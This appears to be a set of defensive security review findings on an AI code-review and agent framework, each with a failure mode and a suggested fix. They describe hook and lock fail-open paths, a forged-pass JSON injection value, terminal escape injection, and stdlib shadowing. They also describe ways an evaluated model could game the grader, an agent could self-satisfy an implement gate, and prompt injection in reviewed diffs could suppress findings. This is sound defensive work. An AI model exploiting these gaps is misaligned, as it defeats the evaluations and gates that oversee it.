findings.cross_file_justification: The CP-11 to CP-14 tests in tests/unit/check-permissions.bats pin the matching grammar implemented in the check-permissions script, which is not in the diff; the tests are the trigger and the script is the affected sink.
findings.description: The grammar pinned by the new tests detects a deny only when the deny key equals the requirement key, equals the requirement's first word, or is universal. Claude Code applies a deny to any command that starts with the rule body, so a deny whose key is a multi-word prefix of a longer requirement (for example deny 'Bash(gh pr *)' against a requirement 'Bash(gh pr merge:*)') would block the run at execution time but pass this preflight with total_denied == 0. CP-14 also pins 'Bash(**)' and any rule with a '*' in a non-trailing position as literal exact bodies, so such a deny is likewise reported as a no-op. The 16 current requirements appear to be one or two words, so the gap is not exercised today, but the next three-word requirement reopens the class the n29 review fix addressed, where a deny passed the preflight and the run stalled later. Impact is availability only; no privilege is gained.
findings.failure_mode: The preflight reports a clean permission set and the run later stalls on a permission prompt or deny.
findings.suggested_fix: Treat a wildcard deny as covering a requirement when the requirement key equals the deny key or starts with the deny key followed by a space (word-boundary prefix), not only first-word equality. Either model '*' at any position or report such rules as unrecognised instead of silently exact. Add a three-word requirement fixture to the CP-13 table so the case is pinned.

findings.description: The new stderr sanitization of the diff-header path in .claude/scripts/lib-content.sh prepare_content() is a blacklist that removes only C0 controls (0x00-0x1F) and DEL. Bytes 0x80-0x9F pass through raw, and UTF-8 encoded C1 controls (e.g. C2 9B = U+009B CSI, C2 9D = U+009D OSC) pass through intact; xterm-family terminals in UTF-8 mode interpret U+009B/U+009D as CSI/OSC by default (allowC1Printable=false). Unicode bidi overrides (U+202E) and zero-width characters also pass. The accompanying test CMP-278 pins this gap rather than catching it: its final assertion explicitly permits every byte in \200-\377 to remain in stderr. The path comes from a `diff --git a/<path> b/` header in the reviewed content, which is attacker-influenced when the pipeline reviews third-party PRs. The raw top_path is still embedded in the PARTIAL/TRUNCATED markers on stdout; that is acceptable since the payload already contains the raw header, but any caller `log` function that writes to a terminal or log file receives the unsanitized C1 range.
findings.failure_mode: A PR containing a file whose path carries UTF-8 encoded C1 sequences (C2 9B ... or C2 9D ...) can inject cursor movement, screen clearing, or title-setting sequences into the reviewer's stderr on xterm-like terminals, hiding or forging adjacent log lines such as the 'shown partially (N of M hunks)' notice that tells the operator the review was incomplete.
findings.suggested_fix: Whitelist instead of blacklist: `top_path_log=$(printf '%s' "$top_path" | LC_ALL=C tr -cd '\040-\176')` (printable ASCII only), or use `printf '%q'` to render the path unambiguously. Tighten CMP-278 to assert that only `[ -~]`, newline and tab remain in stderr (drop `\200-\377` from the allowed set) and add a case with a C2 9B byte pair in the path.

findings.anchor: echo "[hook-guard] WARN: hook $target failed to parse (bash -n) and did not run — failing OPEN (a PreToolUse fence allows the tool); repair the hook, retrying will not help" >&2
findings.description: In .claude/hooks/hook-guard.sh the only check before fail-open is `"${BASH:-bash}" -n "$target"`. That command also fails when the target does not exist (exit 127) or is unreadable (exit 126), so a missing, renamed, or permission-stripped safety hook takes the same branch as a syntax error: the edited WARN line reports 'failed to parse (bash -n)' and the guard exits 0, allowing the tool. Design note (b) in the header states the guard covers parse failures only, but in practice a vanished hook is also failed open, and the diagnostic sends the operator looking for a syntax error in a file that is not there. This is not a regression: Claude Code already treats a non-2 hook exit (including 127) as non-blocking, so the net posture is unchanged. It is a diagnostics and defense-in-depth gap on a file the header itself calls a single point of failure for every wrapped hook, and the diff extends the guard's remit to SessionStart hooks as well.
findings.failure_mode: A bad merge, `git clean`, or an agent Edit that removes or renames block-destructive-bash.sh or zone-write-guard.sh silently disables that fence for every subsequent tool call. The WARN misattributes the cause, so the operator may spend time hunting a syntax error while the fence stays down. A strict-mode (LOA_REQUIRE_ZONES) user, whose zone-write-guard is designed to fail CLOSED when its config is missing, instead gets fail-OPEN when the hook file itself is missing.
findings.suggested_fix: Before `bash -n`, add `if [[ ! -r "$target" ]]; then echo "[hook-guard] WARN: hook $target not found or unreadable — did not run — failing OPEN" >&2; exit 0; fi` so the two causes are distinguished. Optionally, when LOA_REQUIRE_ZONES (strict mode) is set, exit 2 for a missing target since there is no fence to protect and strict-mode users have opted into fail-closed. Add a hook-guard.bats case with a nonexistent target asserting the distinct WARN text.

findings.description: The grader runs its citation parser as `python3 -` with the program on stdin. In that mode sys.path[0] is '' (the current working directory), so the first statement `import json, re, sys` resolves against cwd before the stdlib. The script's own header treats the workspace as hostile (the manifest is 'never copied into the sandbox'), but nothing pins cwd: the harness is handed `$workspace` as an argument and nothing prevents it running `cd "$ws" && grader "$ws" pr-NN`. If cwd is the agent-written workspace, a planted json.py or re.py executes with the grader's privileges, can read every hidden manifest under MANIFEST_DIR, and can print a forged {"pass":true,"score":100,...} with exit 0. The invocation line is unchanged in this diff, but the Python body it executes is rewritten here and the file is the P0 grader.
findings.failure_mode: Arbitrary code execution in the grading context and total grader bypass, conditional on the invoker's working directory being inside (or any agent-writable) directory.
findings.suggested_fix: Run `python3 -I - "$manifest" "$review" "$executor"` (isolated mode drops cwd from sys.path and ignores PYTHON* env vars), and additionally `cd "$SCRIPT_DIR"` before the python call so the grader never inherits an untrusted cwd. Add a bats case that plants a workspace json.py and asserts it is not imported.

findings.trigger_anchor: hit = any(path_matches(p, d["file"]) and not (b < s - 3 or a > s + 3)
findings.description: On any fixture with planted defects, pass/score depend only on recall: false_positives is forced to 0 and len(cites) is reported but never scored (RG-26 grades 400 citations without penalty). This diff deliberately widens what counts as a citation: comma continuations (`path:1,4,7,...`), a bare `:N` / `head:N` that binds to the most recent path, and multi-site anchors[]. Combined with the pre-existing bare-basename rule in path_matches, a review consisting of `block-destructive-bash.sh:1,4,7,...,1000` (or one path followed by a bare `:N` list) lands inside every ±3 window of the file and is graded as detecting every defect in it, with no need to know the directory, the line, or the bug. The clean-fixture half of the criterion is equally forgeable: when a LOA-VERDICT trailer with a counts dict is present, fp is taken from the agent's self-reported critical+high and body citations are ignored, so a trailer of zeros passes any clean fixture regardless of content.
findings.failure_mode: A model under evaluation can obtain pass=true / score=100 on every defect fixture with a content-free line enumeration, and on every clean fixture with a zeroed trailer, inflating the recall and false-positive metrics the eval exists to measure.
findings.suggested_fix: Add a precision term so volume is not free: on defect fixtures count citations that fall outside every anchor window as false positives (or fail when len(cites) > k * planted, or when more than N distinct line windows are cited per file). On clean fixtures do not let the self-reported trailer override observed citations; use max(trailer critical+high, number of distinct body citations) or require them to agree. Surface a `precision` field alongside `recall` in details.

findings.description: The review is read whole with no size check, and the path alternative `[A-Za-z0-9_./+()-]+\.[A-Za-z0-9]{1,6}` is quadratic on a long unbroken run of path-class characters: from every start offset the greedy + consumes the rest of the token, then the engine scans backward to each `.` (CPython's REPEAT_ONE literal skip keeps it in C but it is still O(n) per offset). RG-26 covers a 4,000-char token (~8M steps); a 1 MB hex/base64 blob or minified snippet pasted into a review is ~5e11 steps, i.e. minutes, and a sparse multi-GB review.md created with truncate exhausts memory in .read() before any parsing. The lookback window for the URL check is correctly bounded at 4096, but the main regex is not.
findings.failure_mode: Grader timeout or OOM on a hostile or merely verbose review; a stalled grader can block a batch eval run.
findings.suggested_fix: Reject or truncate reviews above a cap before invoking python (e.g. `[[ $(stat -c %s "$review") -le 2000000 ]] || err "review too large"`). Bound the path class with `{1,512}` and prefix the path alternative with `(?<![A-Za-z0-9_./+()-])` so each token is attempted from one offset with bounded work; the existing RG-11..RG-25 cases still pass because `(`, `*`, backtick and `@` boundaries are preserved. Add a bats case with a 1 MB unbroken token under `timeout 3`.

findings.description: $review_name is interpolated into the JSON result with a raw %s. The only validation (`case ... */*|..*`) rejects a slash and a leading `..`; a name containing `"`, `\` or a newline produces malformed output, and a name such as `x"},"pass":true,"score":100,"details":{"a":"` yields a document whose duplicate top-level `pass` key is read as true by jq and Python (last key wins) even though the script exits 1. The value is the third CLI argument supplied by the harness, not by the agent, which keeps impact low. The err() helper defined two lines earlier already escapes correctly with `jq -Rn --arg`.
findings.failure_mode: Harness JSON parse failure, or with a crafted $3 a result parsed as pass=true that disagrees with the exit status.
findings.suggested_fix: Build the message with jq like err() does: `jq -cn --arg n "$review_name" --argjson p "$(jq '.defects|length' "$manifest")" '{pass:false,score:0,details:{error:("review file not found: "+$n),planted:$p,detected:[],recall:0},grader_version:"1.1.2"}'`. Optionally tighten the name check to `^[A-Za-z0-9._-]+$` as is already done for the fixture id.

findings.cross_file_justification: The diff rewrites all five C-TEAM `why` fields in .claude/data/constraints.json, yet the agent_teams_constraints block in .claude/loa/CLAUDE.loa.md that claims to be generated from that file is untouched, its rendered `Why` text matches neither the old nor the new source, and its hash marker is a non-hex placeholder rather than a content hash.
findings.description: Every other `@constraint-generated` block in CLAUDE.loa.md carries a 16-hex content hash and was regenerated in this diff when its source `why` changed. The Agent Teams block is labelled `DO NOT EDIT — generated from .claude/data/constraints.json` but carries `hash:c020-teamcreate`, was not regenerated despite its source changing, and renders summary text that does not exist in constraints.json. This shows the regeneration and drift-check pipeline does not actually cover this block, so the `generated` and `DO NOT EDIT` assertions are unenforced for the table that defines teammate guardrails (System Zone lockout, beads serialization, .run/ single-writer, git coordination).
findings.failure_mode: Hand edits or stale content in the Agent Teams guardrail table persist indefinitely without the hash-drift check firing. A teammate or script that alters this block (weakening or removing a MUST NOT rule) would not be detected by the same mechanism that protects the other constraint tables, undermining the integrity guarantee of the file that governs multi-agent behaviour.
findings.suggested_fix: Make the generator emit agent_teams_constraints from constraints.json using the same 16-hex content hash format, regenerate the block so its text matches source, and make the sync validator fail on any `@constraint-generated` marker whose hash does not match the rendered rows. Add a test that iterates every generated block and asserts hash-to-content agreement so a placeholder hash cannot pass again.

findings.description: The hard CI ceiling for the always-loaded CLAUDE.loa.md was raised from 9,216 B to 10,240 B in the same change that re-adds the content it must fit (Reference Files table, truenames table, NOTES clause, longer rationales). The gate was moved to fit the payload rather than the payload trimmed to fit the gate. The rationale (replay A/B ablation on audit-pr-02/05 showed the trim degraded audit recall) is security-positive and is written in the bats header, but the tool header still cites only cycle-124 FR-8 and gives no reason for the new ceiling. The literal is duplicated in the header comment, the Python constant, and two bats assertions.
findings.failure_mode: The next prompt growth cites this PR as precedent and ratchets the limit again without ablation evidence; the budget degrades from a control into a number that tracks current size.
findings.suggested_fix: Record the ablation reference (sprint-250 replay-ab-rerun) beside LOA_LIMIT in the tool header. Source the limit from one place (e.g. a constant the bats file reads via --json .claude_loa.limit) so changes are a single, reviewable edit.

findings.description: Resource charging fires only when a single SKILL.md line both matches resources/<flat-name>.md and contains an imperative with no guard word. A skill evades the budget with any of: a nested path (resources/sub/X.md, '/' is not in the class), a non-.md resource (X.yaml, X.txt), a multi-line form ('Read the following:' then '- resources/X.md'), or a guard token used as emphasis ('Read only `resources/X.md`', 'Read `resources/X.md`; see §2'). Separately, os.path.getsize and open() follow symlinks: a SKILL.md or resource symlinked to a FIFO or /dev/stdin blocks the CI job indefinitely, and a directory named CLAUDE.loa.md yields present=False, bytes=0, ok=True and passes. The header already acknowledges guard-word pointers as accepted behaviour, so this is a hardening note rather than a bypass of a security boundary.
findings.failure_mode: Always-loaded prompt bytes exceed budget undetected, or a crafted fixture/PR stalls the budget CI step. Impact limited to prompt hygiene and CI availability.
findings.suggested_fix: Use os.lstat and reject symlinks and non-regular files (treat as breach). Broaden RES to resources/[^`'" )]+ and charge any existing file regardless of extension. Treat a missing or non-regular CLAUDE.loa.md as a violation instead of ok=True with 0 bytes. Consider charging a resource when it is named within N lines of an unguarded imperative.

findings.description: Both tools/check-prompt-budget.sh and the new IDR-3 test run `python3 -` with the script on stdin. In that mode sys.path[0] is '' (the current working directory), so `import glob, json, os, re, sys` resolves against cwd before the stdlib. When the checker is run from inside an untrusted checkout (fork PR CI, or cd into a downloaded fixture tree before passing --root) a planted json.py or glob.py executes with the CI job's privileges. Because bats already executes repository shell code in the same job, the marginal exposure is small, but the fix is a single flag.
findings.failure_mode: Arbitrary code execution in the CI job from a shadowed stdlib module placed at the repo root of a PR branch; primarily a concern for forks or fixture trees executed in-place.
findings.suggested_fix: Invoke `python3 -I -` in both the tool and the bats test (-I implies -E -s and drops cwd/script dir from sys.path).

findings.description: As rendered in the diff, .claude/data/constraints.json is a flat {"C-PROC-001": "<why>", ...} map. IDR-3's walker only records objects that carry both an "id" and a "why" key, and IDR-4's jq filter is `select(.id? == $id) | .why`. Against the diffed shape both produce nothing: IDR-3 reports all twelve ids as mismatched and exits 1; IDR-4 greps for '| null |' and fails. The referenced fixture tests/fixtures/constraint-rationales-pre-diet.json is also absent from the diff. The hunk header `@@ -0,0 +1,14 @@` paired with a non-empty-blob index suggests the diff view is condensed and the real file may be the id/why array the tests expect; this should be confirmed before merge. Failure is loud (CI red), not a silent pass, so there is no gate-bypass risk, only a broken pin on the revert this PR exists to protect.
findings.failure_mode: The new tests fail on first run, or are 'fixed' by relaxing the assertion, leaving the reverted rationales unpinned.
findings.suggested_fix: Verify the committed constraints.json shape matches the walkers; add tests/fixtures/constraint-rationales-pre-diet.json to the change; or make the walker accept both the flat map and the id/why object form.

findings.trigger_anchor: the agy adapter documents that its prompt, still on argv, is readable through `/proc/<pid>/cmdline`
findings.description: The changelog records that the claude and gemini headless adapters were moved to stdin precisely because an argv prompt is world-readable via /proc/<pid>/cmdline, yet it ships the agy adapter with the prompt still on argv, and gemini falls back to argv whenever an operator puts --sandbox (or -sd / --sandbox=true) in gemini_extra_flags. The prompt is the full diff under review plus repair payloads, so on any multi-user host every local account can read proprietary code, embedded secrets in the diff, and the reviewer instructions for the lifetime of the CLI process. The fix only 'documents' the exposure rather than closing it. Note: only the changelog is in this diff; verify against cheval's agy and gemini adapters.
findings.failure_mode: Any unprivileged local user reads the review prompt (the code under review, including any secrets it contains) from /proc/<pid>/cmdline while an agy hop or a sandboxed gemini hop runs.
findings.suggested_fix: Deliver the agy prompt on stdin or via a 0600 prompt file inside the private per-hop workspace (as grok already does). For gemini, refuse to start when gemini_extra_flags requests a sandbox instead of silently falling back to argv, or write the prompt to a 0600 file and pass it by path.

findings.trigger_anchor: a git older than 2.41 ignores it, which is said once as a WARN: a committed `-diff` line hid a hunk from both voices
findings.description: --diff-range reads attributes from the empty tree via GIT_ATTR_SOURCE so a committed .gitattributes cannot hide hunks, but the changelog states that on git < 2.41 the variable is ignored and the only mitigation is a one-time WARN. On such hosts an author can commit a `*.sh -diff` (or path-specific) attribute line in the same range, and the audited code shows as 'Binary files differ' to both the primary and companion voice. The security audit then passes with no findings for code it never saw. A warning in a log is not a control for a review-bypass primitive. Verify in adversarial-review.sh's --diff-range path.
findings.failure_mode: On a host with git < 2.41, a reviewer-hostile commit adds a -diff attribute and the dissent/security audit silently reviews a diff with the hidden files reduced to 'Binary files differ', producing a clean verdict for unreviewed code.
findings.suggested_fix: When git < 2.41 is detected, either refuse --diff-range (status line, exit 1) or pass `--text --no-textconv --no-ext-diff` so attribute-driven binary classification cannot suppress hunks; additionally emit a finding or set DEGRADED_SECURITY_REVIEW rather than only a WARN.

findings.trigger_anchor: a run lock that cannot be made for a reason other than contention (or an unopenable takeover section) runs unguarded at once with that reason
findings.description: Several lock paths are fail-open: a run lock that cannot be created for a non-contention reason runs unguarded, a flock exiting with anything other than 1 runs unguarded, and without flock a dead holder's takeover runs unserialised. Two unguarded runs for the same (sprint, gate) race on the envelope, .prev move-aside and rejected sidecars, so one run's findings can be displaced by another's and verdict-derive.sh can read a mixed or truncated state. On a shared host, conditions that make lock creation fail (quota, permissions on the runtime dir) can be induced by another account. Fail-closed (refuse with workdir_unavailable) is the safer default for a review gate.
findings.failure_mode: Lock creation or flock fails for an environmental reason, two dissent runs proceed concurrently, and the envelope or sidecars at the shared path reflect a mix of runs or a displaced result.
findings.suggested_fix: Refuse the run (status workdir_unavailable / lock_unavailable, exit 1) when the lock cannot be established for any reason other than a confirmed dead holder, or require an explicit --allow-unguarded override.

findings.trigger_anchor: `adversarial-review.sh --record-fallback <status> --reason <text>` writes the documented fallback envelope under the run lock (the review and audit skills' allowlists can run it
findings.description: The LLM-driven review and audit skills are now allowlisted to run --record-fallback with caller-chosen --status, --reason and --since. The only guard against displacing a real envelope is that an envelope newer than --since is refused, but --since is supplied by the same caller. A prompt-injected or misbehaving skill invocation can therefore move aside a standing envelope that holds findings and replace it with a fallback record of its choosing. The result is suppression of findings rather than a forged pass, since verdict-derive.sh will see a fallback status, but it converts a completed audit into a 'failed/aborted' one on demand.
findings.failure_mode: The skill (or an injected instruction in the reviewed diff) runs --record-fallback with a future --since, displacing an envelope containing findings and leaving a fallback record in its place.
findings.suggested_fix: Have --record-fallback refuse to displace any envelope whose status is a completed run, or require --since to match the `run started <ts>` recorded in the run's own state file rather than accepting an arbitrary timestamp; do not allowlist displacement for the skill, only recording when no envelope exists.

findings.trigger_anchor: gemini runs with `GEMINI_SANDBOX=false` (an ambient `GEMINI_SANDBOX` or `tools.sandbox` asks for none)
findings.description: To keep the prompt off argv the gemini headless hop now forces GEMINI_SANDBOX=false and overrides any operator sandbox setting. The reviewer CLI consumes an untrusted diff as its prompt; prompt injection in reviewed code could drive gemini-cli tool calls, and the sandbox was the layer limiting what such calls could touch. The isolated empty cwd under a private base mitigates file-system reach, but network and any auto-approved tools remain available. Trading sandboxing for argv confidentiality is a reasonable call, but it should be an explicit, documented default with yolo/auto-approve modes verified off in headless mode.
findings.failure_mode: Injected instructions in the reviewed diff cause the unsandboxed gemini-cli to execute a tool call with host-level reach that the sandbox would have contained.
findings.suggested_fix: Confirm headless gemini runs with tool approval disabled (no --yolo / auto-approve), pass the prompt via a 0600 file so the sandbox can stay on, and document the tradeoff on the gemini-headless catalog entry.

findings.anchor: CHANGELOG.md: Cycle-126 addendum bullet '**Implement-gate evidence on `/loa`.**'
findings.trigger_anchor: CHANGELOG.md: Cycle-126 addendum bullet '**Implement-gate evidence on `/loa`.**'
findings.cross_file_justification: grimoires/loa/sdd.md D-4.4 (context lines in this diff) still specifies an `implement_gate.mode: authoritative` branch tested against PreToolUse payloads 'with and without `active_skill`'. The new CHANGELOG text states the harness sets no skill field, `tool_input` is model-written, and `active_skill` 'never changes the gate's decision'. The two documents now disagree on whether a model-controlled field can drive the gate.
findings.description: The CHANGELOG correctly documents that `tool_input.active_skill` is untrusted (written by the model, not the harness) and is recorded as evidence only. The SDD D-4.4 design, unchanged in this diff, still describes an opt-in authoritative mode whose decision input is that same field. Nothing in the diff withdraws D-4.4 or records that authoritative mode was abandoned.
findings.failure_mode: If the authoritative branch exists in `implement-gate.sh`, or is later implemented from the SDD as written, the model can include `active_skill: implementing` (or whatever value the gate expects) in its own tool call input and satisfy the implement gate without the `.run/` state the heuristic path requires. The gate's purpose (blocking write tools outside an active implementation run) would be bypassable by the agent it constrains.
findings.suggested_fix: Amend SDD D-4.4 in this change to state that authoritative mode is withdrawn until the harness provides a harness-set skill field, and that `implement_gate.mode` is not honoured. Add a unit test asserting the gate decision is identical for payloads with and without `tool_input.active_skill`. Verify no `authoritative` branch remains in `.claude/hooks/implement-gate.sh` or `detect-platform-features.sh`.

findings.anchor: CHANGELOG.md: Cycle-126 addendum bullet '**A host with one provider family.**'
findings.description: The guidance tells operators on single-provider hosts to set `flatline_protocol.security_audit.companion_voice: false` so audits stop being marked `DEGRADED_SECURITY_REVIEW`. On such a host the companion voice cannot run either way, so the config change does not restore two-voice coverage. It only removes the marker that records the audit ran at reduced assurance.
findings.failure_mode: Security audits on single-family hosts are produced without the degradation marker while remaining single-voice. Any downstream consumer that keys on `DEGRADED_SECURITY_REVIEW` (merge gates, envelope verifiers, the Decision Log) accepts a reduced-assurance audit as a full one, and the audit trail no longer distinguishes a deliberate two-voice review from one that silently lost its second voice.
findings.suggested_fix: Keep a visible status in the envelope whenever a `security_audit` completes with one voice, regardless of why (e.g. `companion_voice: disabled_by_config` alongside `planned: false, reason: no_route`). Reword the addendum to say the marker is correct on one-family hosts and that disabling the companion is a recorded assurance downgrade, not a fix. Add a test that a config-disabled companion on `security_audit` still produces a distinguishable degraded status.

findings.anchor: grimoires/loa/known-failures.md: KF-040 '**Current workaround**' line and '### Reading guide'
findings.description: KF-040 documents that the direct Anthropic API refused a request with a 400 'not allowed from unsupported countries, regions, or territories', and records as the current workaround routing the same hop through `~/.local/bin/claude-bedrock`. The second attempt row adds a caveat to confirm the Bedrock region, but the entry still presents Bedrock as the standard run mode for this condition and leaves open whether `claude-fallback` should auto-switch on this 400.
findings.failure_mode: Operators treat a provider-side regional access-control refusal as a routing problem and send the same workload through another provider from the same egress location. If the Bedrock region or the operator's AWS terms do not permit that location either, the organisation is out of compliance with both providers while the run succeeds. If `claude-fallback` is later changed to fall back on this 400, the restriction is bypassed silently with no operator decision recorded.
findings.suggested_fix: Reorder the reading guide so the first instruction is to resolve the host egress (VPN/region) and confirm the direct route works, with Bedrock presented as a conditional route that requires a recorded region and terms check. State explicitly that `claude-fallback` must not auto-fallback on the geo 400 and that this is a deliberate decision. Have the E2E evidence record the egress region used for any Bedrock-routed hop.

findings.anchor: CHANGELOG.md: Cycle-126 addendum bullet '**Opus 5.5 is the `opus` alias.**', sentence beginning 'Every Anthropic entry in the catalog, direct or through Bedrock, now has a `model-permissions.yaml` row'
findings.trigger_anchor: CHANGELOG.md: 'Every Anthropic entry in the catalog ... now has a `model-permissions.yaml` row with the same trust scopes as `claude-opus-4-7`'
findings.cross_file_justification: grimoires/loa/sdd.md D-4.2 (context in this diff) records that `model-permissions.yaml` is read by `routing/context_filter.py` and is covered by no signature, digest or trust-store reference. The D-4.1 amendment added in this diff introduces `claude-opus-5-5` sourced from vendor web pages with a `fallback_chain` to `claude-opus-5`, and the CHANGELOG states every catalog entry, including Bedrock routes, inherited the 4.7 scopes.
findings.description: Trust scopes governing which context classes may be sent to a model were copied wholesale from `claude-opus-4-7` to every Anthropic catalog entry, including Bedrock-routed ones and the newly added `claude-opus-5-5`. The registry is unsigned and the only test asserts a row exists, not that its scopes were reviewed. The CHANGELOG notes the rows have no runtime effect unless `hounfour.feature_flags.context_filtering` is enabled.
findings.failure_mode: When `context_filtering` is turned on, sensitive context classes are released to models and routes (including third-party-hosted Bedrock endpoints) that were never individually assessed, because the registry says they are trusted at the same level as a reviewed model. A future catalog addition that passes `test_trust_scopes.py` by copying a row gains the same access automatically. An unsigned registry means an unreviewed edit to those scopes is indistinguishable from a reviewed one.
findings.suggested_fix: Record a per-entry review note in `model-permissions.yaml` for each new row (who reviewed, date, basis), and extend `test_trust_scopes.py` to fail on a row with no review annotation. Distinguish Bedrock routes from direct routes in scope assignment. Consider adding the registry to the signed trust store or a checksummed sidecar so edits require operator signing, since it becomes a runtime authorisation input once the feature flag is enabled.

findings.description: readCatalog coerces a present-but-non-object `aliases:` block to `{}`, and resolveAliases silently `continue`s past non-string targets, unqualified targets, and provider-qualified targets that are not in the flattened catalog. Any of these drops the alias from GENERATED_MODEL_ALIASES with no diagnostic. Because effectiveInputBudget treats an unresolved id as unknown and returns the raw operator budget, a malformed or typo'd alias entry (including the default `opus`) silently restores the pre-fix behavior: a 160-200K prompt bypasses truncation and is dispatched past cheval's 180K ceiling. The getTokenBudget("opus") unit test catches this only for `opus`, and only when the generated twin is regenerated and the suite is re-run.
findings.failure_mode: Silent fail-open. A catalog edit or YAML mistake disables model-budget clamping for the affected alias; oversized prompts reach the provider pre-flight gate and the review fails (exit 7) or wastes tokens. Availability and cost impact limited to the review pipeline.
findings.suggested_fix: In readCatalog, raise ConfigError when `aliases` is present but not a plain object. In resolveAliases, emit a warning (or error under --check) for provider-qualified string targets that are not in `known`, with an explicit allowlist for intentionally unresolvable providers such as `native`. Optionally assert in the generator that DEFAULTS.model resolves to a budget row.

findings.description: effectiveInputBudget remains fail-open: when budgetId(model) does not resolve to a row in GENERATED_TOKEN_BUDGETS or TOKEN_BUDGETS, the operator budget is returned unclamped. The new alias hop consults only the framework catalog. An operator alias overlay in .loa.config.yaml that retargets `opus` (or any alias) to a model with a smaller ceiling is still budgeted against the catalog target's row, and a model id the catalog lacks is not clamped at all. PR diff size is attacker-controlled input and this clamp is the control that bounds what is dispatched, so an unresolvable model id removes that bound. The limitation is documented in code comments but is never surfaced at runtime.
findings.failure_mode: Oversized prompt dispatched past the real model ceiling; the review fails with a provider rejection or incurs unnecessary token cost. No confidentiality or integrity impact.
findings.suggested_fix: Log a warning at ReviewPipeline construction when config.model does not resolve to a known budget row so operators see the fail-open. Longer term, resolve aliases at config-load time against the effective overlay-merged catalog rather than at codegen time, or fall back to a conservative default row instead of the raw operator budget when an alias fails to resolve.
